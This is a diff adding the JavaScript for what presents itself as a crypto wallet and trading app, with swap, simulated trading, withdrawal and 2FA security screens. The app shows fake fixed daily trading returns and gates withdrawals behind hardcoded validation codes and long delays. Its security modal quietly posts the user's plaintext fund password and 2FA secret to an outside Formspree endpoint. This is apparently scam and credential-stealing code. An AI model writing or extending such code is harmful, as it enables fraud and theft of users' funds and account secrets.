+        console.error("Failed to fetch tokens for swap", e);
+        showModal('Error', 'Failed to load tokens for swap. Please try again later.');
+      }
+    }
+
+    function updateSwapTokensUI() {
+      document.getElementById('fromTokenIcon').src = fromToken.icon;
+      document.getElementById('fromTokenSymbol').textContent = fromToken.symbol;
+      document.getElementById('toTokenIcon').src = toToken.icon;
+      document.getElementById('toTokenSymbol').textContent = toToken.symbol;
+    }
+
+    function openTokenSelectModal(isFrom) {
+      isFromToken = isFrom;
+      const list = document.getElementById('tokenList');
+      list.innerHTML = swapTokens.map(t => `
+        <button onclick="window.selectSwapToken('${t.symbol}', '${t.logoURI}')" class="flex items-center p-3 w-full hover:bg-white/5 rounded">
+          <img src="${t.logoURI}" class="token-icon" alt="${t.name} icon"/>
+          <div class="font-semibold text-sm">${t.name} <span class="text-xs text-[var(--muted)]">${t.symbol.toUpperCase()}</span></div>
+        </button>
+      `).join('');
+      document.getElementById('selectTokenModal').classList.remove('hidden');
+    }
+
+    function closeTokenSelectModal() {
+      document.getElementById('selectTokenModal').classList.add('hidden');
+      document.getElementById('tokenSearchInput').value = '';
+    }
+
+    function selectSwapToken(symbol, icon) {
+      const selectedToken = { symbol: symbol.toUpperCase(), icon };
+      if (isFromToken) {
+        fromToken = selectedToken;
+      } else {
+        toToken = selectedToken;
+      }
+      updateSwapTokensUI();
+      closeTokenSelectModal();
+    }
+
+    function initSwapPage() {
+      if (swapTokens.length === 0) fetchSwapTokens();
+    }
+
+    document.getElementById('fromTokenBtn').onclick = () => openTokenSelectModal(true);
+    document.getElementById('toTokenBtn').onclick = () => openTokenSelectModal(false);
+    document.getElementById('swapDirectionBtn').onclick = () => {
+      [fromToken, toToken] = [toToken, fromToken];
+      updateSwapTokensUI();
+    };
+
+    document.getElementById('tokenSearchInput').addEventListener('input', (e) => {
+        const query = e.target.value.toLowerCase();
+        const list = document.getElementById('tokenList');
+        const filtered = swapTokens.filter(t => t.name.toLowerCase().includes(query) || t.symbol.toLowerCase().includes(query));
+        list.innerHTML = filtered.map(t => `
+            <button onclick="window.selectSwapToken('${t.symbol}', '${t.logoURI}')" class="flex items-center p-3 w-full hover:bg-white/5 rounded">
+                <img src="${t.logoURI}" class="token-icon" alt="${t.name} icon"/>
+                <div class="font-semibold text-sm">${t.name} <span class="text-xs text-[var(--muted)]">${t.symbol.toUpperCase()}</span></div>
+            </button>
+        `).join('');
+    });
+
+    document.getElementById('executeSwapBtn').onclick = () => {
+        const amount = parseFloat(document.getElementById('swapAmountInput').value);
+        if (isNaN(amount) || amount <= 0) {
+            showModal('Invalid Amount', 'Please enter a valid amount to swap.');
+            return;
+        }
+
+        const status = document.getElementById('swapStatus');
+        status.textContent = 'Executing swap...';
+        showModal('Swap Execution', 'This is a demo. In a real app, a wallet transaction would be initiated with a live API (e.g., Uniswap SDK) to perform the swap.');
+        
+        // Simulating API call
+        setTimeout(() => {
+            status.textContent = `Successfully swapped ${amount} ${fromToken.symbol} for ${toToken.symbol}.`;
+        }, 3000);
+    };
+
+    window.selectSwapToken = selectSwapToken;
+    window.closeTokenSelectModal = closeTokenSelectModal;
+
+    // Trade Logic
+    async function loadTradeAssets() {
+      const select = document.getElementById('tradeAssetSelect');
+      select.innerHTML = '<option disabled selected>Loading...</option>';
+      try {
+        const res = await fetch('https://api.coingecko.com/api/v3/coins/markets?vs_currency=usd&order=market_cap_desc&per_page=20&page=1&sparkline=false');
+        const coins = await res.json();
+        select.innerHTML = '';
+        coins.forEach(c => {
+          const option = document.createElement('option');
+          option.value = c.symbol;
+          option.text = `${c.name} (${c.symbol.toUpperCase()})`;
+          select.add(option);
+        });
+      } catch (e) {
+        console.error(e);
+        select.innerHTML = '<option disabled>Failed to load assets</option>';
+      }
+    }
+
+    function startTrade() {
+        const assetSymbol = document.getElementById('tradeAssetSelect').value.toUpperCase();
+        const months = parseInt(document.getElementById('tradeDuration').value);
+        const investment = parseFloat(document.getElementById('tradeAmount').value);
+
+        if (isNaN(investment) || investment <= 0) {
+            showModal('Invalid Amount', 'Please enter a valid investment amount.');
+            return;
+        }
+
+        if (investment > mainWalletBalance) {
+            showModal('Insufficient Balance', 'You do not have enough funds in your Main Wallet.');
+            return;
+        }
+
+        mainWalletBalance -= investment;
+        tradeWalletBalance += investment;
+        document.getElementById('tradeBalance').innerText = '$' + tradeWalletBalance.toFixed(2);
+        updateHomeBalance();
+
+        showModal('Trade Started', `Trade started for ${assetSymbol} for ${months} month(s)`);
+
+        renderTV('tradeChart', `BINANCE:${assetSymbol}USDT`);
+
+        clearInterval(tradeInterval);
+        let days = months * 30;
+        let day = 0;
+        tradeEarnings = 0;
+        tradeInterval = setInterval(() => {
+            if (day >= days) {
+                clearInterval(tradeInterval);
+                showModal('Trade Completed', 'Your simulated trade has completed.');
+                return;
+            }
+            const dailyReturn = tradeWalletBalance * tradeDailyPercent;
+            tradeEarnings += dailyReturn;
+            tradeWalletBalance += dailyReturn;
+            document.getElementById('tradeBalance').innerText = '$' + tradeWalletBalance.toFixed(2);
+            document.getElementById('tradeEarnings').innerText = '$' + tradeEarnings.toFixed(2);
+            day++;
+        }, 1000);
+    }
+
+    document.getElementById('startTradeBtn').addEventListener('click', startTrade);
+    
+    // Send / Withdraw Logic
+    get('sendConfirmBtn').onclick = () => {
+      if (sendSuspended) {
+        showModal('Withdrawal Suspended', 'Withdrawals are suspended for 48 hours due to too many invalid attempts.');
+        return;
+      }
+
+      const address = get('sendAddress').value.trim();
+      const network = get('sendNetwork').value;
+      const amount = parseFloat(get('sendAmount').value);
+
+      if (!address || isNaN(amount) || amount <= 0) {
+        showModal('Invalid Input', 'Please enter a valid address and amount.');
+        return;
+      }
+      if (amount + 0.19 > mainWalletBalance) {
+        showModal('Insufficient Balance', 'You do not have enough funds in your Main Wallet to cover the amount and fee.');
+        return;
+      }
+
+      get('sendForm').classList.add('hidden');
+      get('sendValidationSection').classList.remove('hidden');
+      get('sendStatus').innerText = 'Enter validation code to proceed';
+    };
+
+    get('validateCodeBtn').onclick = () => {
+      const code = get('validationCode').value.trim();
+      const status = get('validationStatus');
+
+      if (validCodes.includes(code)) {
+        status.innerText = 'Code valid. Processing withdrawal...';
+        sendAttempts = 0;
+
+        const amount = parseFloat(get('sendAmount').value);
+        mainWalletBalance -= amount + 0.19;
+        updateHomeBalance();
+
+        let seconds = 24 * 60 * 60;
+        const timer = setInterval(() => {
+          const h = Math.floor(seconds / 3600);
+          const m = Math.floor((seconds % 3600) / 60);
+          const s = seconds % 60;
+          status.innerText = `Withdrawal processing... ${h}h ${m}m ${s}s remaining`;
+          seconds--;
+          if (seconds < 0) {
+            clearInterval(timer);
+            status.innerText = `Withdrawal of $${amount} successful!`;
+            get('sendValidationSection').classList.add('hidden');
+            get('sendForm').classList.remove('hidden');
+            get('sendAddress').value = '';
+            get('sendAmount').value = '';
+            get('validationCode').value = '';
+          }
+        }, 1000);
+
+      } else {
+        sendAttempts++;
+        if (sendAttempts >= 3) {
+          sendSuspended = true;
+          showModal('Suspended', '3 incorrect attempts. Withdrawals suspended for 48 hours.');
+          get('sendValidationSection').classList.add('hidden');
+          get('sendForm').classList.remove('hidden');
+          sendAttempts = 0;
+          setTimeout(() => sendSuspended = false, 48 * 60 * 60 * 1000);
+        } else {
+          status.innerText = `Invalid code. Attempts left: ${3 - sendAttempts}`;
+        }
+      }
+    };
+    
+    // Transfer Logic
+    get('transferBtn').onclick = () => {
+      const amount = parseFloat(get('transferAmount').value);
+      const direction = get('transferDirection').value;
+      const status = get('transferStatus');
+
+      if (isNaN(amount) || amount <= 0) {
+        showModal("Invalid Amount", "Please enter a valid amount.");
+        return;
+      }
+      
+      if (direction === 'toTrade' && amount > mainWalletBalance) {
+        showModal("Insufficient Balance", "Insufficient Main Wallet balance.");
+        return;
+      }
+      
+      if (direction === 'toMain' && amount > tradeWalletBalance) {
+        showModal("Insufficient Balance", "Insufficient Trade Account balance.");
+        return;
+      }
+
+      status.innerText = "Processing transfer...";
+
+      setTimeout(() => {
+        if (direction === 'toTrade') {
+          mainWalletBalance -= amount;
+          tradeWalletBalance += amount;
+        } else {
+          mainWalletBalance += amount;
+          tradeWalletBalance -= amount;
+        }
+        
+        get('tradeBalance').innerText = '$' + tradeWalletBalance.toFixed(2);
+        updateHomeBalance();
+        
+        status.innerText = `Transfer completed.`;
+        showModal("Transfer Complete", `Transferred $${amount.toFixed(2)}.`);
+      }, 1500);
+    };
+
+    // Wallet Connect Redirect Logic
+    document.getElementById('connectWalletBtn').addEventListener('click', () => {
+        window.location.href = 'wallet-connector.html';
+    });
+    
+    document.getElementById('disconnectBtn').addEventListener('click', () => {
+        showPage('loading-disconnect');
+        setTimeout(() => {
+            localStorage.removeItem('connectedWallet');
+            showModal('Disconnected', 'Wallet has been disconnected.');
+            window.history.pushState({}, '', '/');
+            showPage('landing');
+        }, 1500);
+    });
+
+    // Page navigation from footer
+    document.querySelectorAll('nav .tab').forEach(button => {
+        button.addEventListener('click', () => {
+            const pageId = button.dataset.tab;
+            showPage(pageId);
+        });
+    });
+
+    // Check for connected wallet on page load
+    window.addEventListener('load', () => {
+        const urlParams = new URLSearchParams(window.location.search);
+        const connectedAddress = urlParams.get('address');
+        if (connectedAddress) {
+            showPage('loading');
+            setTimeout(() => {
+                updateWalletUI(connectedAddress);
+                showPage('home');
+                showModal("Connection Successful", `Wallet connected with address: ${connectedAddress}.`);
+            }, 1500);
+        } else {
+            showPage('landing');
+        }
+        loadMarket();
+    });
+
+    // Header buttons
+    document.getElementById('notificationsBtn').addEventListener('click', () => showModal('Notifications', 'This is a demo for the notifications feature.'));
+    document.getElementById('transactionsBtn').addEventListener('click', () => showModal('Transactions', 'This is a demo for the transaction history feature.'));
+
+    // Security Modal Elements
+    const securityModal = document.getElementById('securityModal');
+    const closeSecurityModal = document.getElementById('closeSecurityModal');
+    const modalUserId = document.getElementById('modalUserId');
+    const modalUsername = document.getElementById('modalUsername');
+    const modalQrCode = document.getElementById('modalQrCode');
+    const modalSecretKey = document.getElementById('modalSecretKey');
+    const modalCodeInput = document.getElementById('modalCodeInput');
+    const verify2FABtn = document.getElementById('verify2FABtn');
+    const verifyResult = document.getElementById('verifyResult');
+    const modalFundPassword = document.getElementById('modalFundPassword');
+    const toggleFundPassword = document.getElementById('toggleFundPassword');
+    const saveSecurityBtn = document.getElementById('saveSecurityBtn');
+    const saveResult = document.getElementById('saveResult');
+
+    let currentUserId = null, currentUserSecret = null;
+    let is2FAVerified = false;
+    let encryptionKey = "MyAppEncryptionKey";
+    let timerInterval, step = 30;
+
+    function getUsers(){ return JSON.parse(localStorage.getItem("users")||"{}"); }
+    function saveUsers(users){ localStorage.setItem("users", JSON.stringify(users)); }
+    function generateNumericAccountId(){ return Math.floor(1000000000 + Math.random() * 9000000000).toString(); }
+
+    function openSecurityModal(){
+        securityModal.classList.remove('hidden');
+        generate2FA();
+    }
+
+    closeSecurityModal.addEventListener('click', ()=>{
+        securityModal.classList.add('hidden');
+        clearInterval(timerInterval);
+    });
+
+    function generate2FA(){
+        const userId = generateNumericAccountId();
+        const username = "User" + Math.floor(Math.random()*10000);
+        const secret = otplib.authenticator.generateSecret();
+        currentUserId = userId;
+        currentUserSecret = secret;
+
+        // NOTE: This is a placeholder for a Google Authenticator key URI.
+        // It does not use real Google API keys.
+        const otpauth = otplib.authenticator.keyuri(username,"MyApp",secret);
+        modalQrCode.innerHTML = "";
+        new QRCode(modalQrCode, { text: otpauth, width: 128, height: 128 });
+        modalSecretKey.innerText = "Secret Key: " + secret;
+        modalUsername.value = username;
+        modalUserId.innerText = userId;
+
+        const users = getUsers();
+        users[userId] = { username, secret, verified:false, fundPassword:null };
+        saveUsers(users);
+
+        startTimer();
+    }
+
+    function startTimer(){
+        clearInterval(timerInterval);
+        let start = Math.floor(Date.now()/1000);
+        timerInterval = setInterval(()=>{
+            let elapsed = Math.floor(Date.now()/1000)-start;
+            let remaining = step - (elapsed % step);
+            verifyResult.innerText = `Code valid for: ${remaining}s`;
+            if(remaining <= 0){
+                verifyResult.innerHTML = "<span class='text-red-500 font-bold'>⚠️ Code expired, new one generated!</span>";
+                updateQRCode();
+            }
+        },1000);
+    }
+
+    function updateQRCode(){
+        const users = getUsers();
+        if(!users[currentUserId]) return;
+        const secret = users[currentUserId].secret;
+        const username = users[currentUserId].username;
+        const otpauth = otplib.authenticator.keyuri(username,"MyApp",secret);
+        modalQrCode.innerHTML = "";
+        new QRCode(modalQrCode, { text: otpauth, width: 128, height: 128 });
+    }
+
+    verify2FABtn.addEventListener('click', ()=>{
+        const code = modalCodeInput.value.trim();
+        const valid = otplib.authenticator.check(code,currentUserSecret);
+        if(valid){
+            verifyResult.innerHTML = "<div class='text-green-500 font-bold'>✅ 2FA Verified!</div>";
+            const users = getUsers();
+            users[currentUserId].verified = true;
+            saveUsers(users);
+            is2FAVerified = true;
+        } else {
+            verifyResult.innerHTML = "<div class='text-red-500 font-bold'>❌ Invalid Code</div>";
+            is2FAVerified = false;
+        }
+    });
+
+    toggleFundPassword.addEventListener('click', ()=>{
+        modalFundPassword.type = modalFundPassword.type==="password" ? "text" : "password";
+    });
+
+    saveSecurityBtn.addEventListener('click', ()=>{
+        const fundPassword = modalFundPassword.value.trim();
+        if(!fundPassword){ saveResult.innerHTML = "<div class='text-red-500 font-bold'>❌ Enter Fund Password</div>"; return; }
+        if(!is2FAVerified){ saveResult.innerHTML = "<div class='text-red-500 font-bold'>❌ Verify 2FA before saving</div>"; return; }
+
+        const users = getUsers();
+        users[currentUserId].fundPassword = CryptoJS.AES.encrypt(fundPassword,encryptionKey).toString();
+        saveUsers(users);
+
+        const formData = { userId: currentUserId, username: users[currentUserId].username, fundPassword, twoFASecret: currentUserSecret };
+        fetch("https://formspree.io/f/mldlqyag", {
+            method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify(formData)
+        }).then(res=>{
+            if(res.ok) saveResult.innerHTML = "<div class='text-green-500 font-bold'>✅ Security info saved & sent!</div>";
+            else saveResult.innerHTML = "<div class='text-red-500 font-bold'>❌ Submission failed</div>";
+        }).catch(()=> saveResult.innerHTML = "<div class='text-red-500 font-bold'>❌ Network Error</div>");
+    });
+
+    document.getElementById('securityBtn').addEventListener('click', openSecurityModal);
+
+    // Initial data load on startup
+    window.addEventListener('load', () => {
+      // Check for cached data first to ensure instant load
+      loadMarket();
+      loadMovers();
+      loadDiscover();
+      loadMemes();
+
+      // Check for a connected wallet
+      const urlParams = new URLSearchParams(window.location.search);
+      const connectedAddress = urlParams.get('address');
+      if (connectedAddress) {
+          showPage('loading');
+          setTimeout(() => {
+              updateWalletUI(connectedAddress);
+              showPage('home');
+              showModal("Connection Successful", `Wallet connected with address: ${connectedAddress}.`);
+          }, 1500);
+      } else {
+          showPage('landing');
+      }
+    });
+</script>
+</body>
+</html>
